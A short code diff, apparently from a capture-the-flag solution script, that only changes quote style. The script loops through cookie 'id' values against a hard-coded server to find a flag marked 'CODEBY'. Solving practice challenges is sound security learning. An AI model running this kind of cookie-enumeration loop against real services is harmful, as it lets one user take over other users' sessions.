@@ -11,12 +11,12 @@ def get_flag() -> str:
     base_url = "http://62.173.140.174"
     port = 16003
 
-    flag = ""
+    flag = ''
 
     for i in range(129):
         cookies = {"id": f"{i}"}
 
-        response = get(f"{base_url}:{port}", cookies=cookies).text.split("\n")
+        response = get(f"{base_url}:{port}", cookies=cookies).text.split('\n')
 
         if "CODEBY" in response[-1]:
             flag = response[-1][12:]
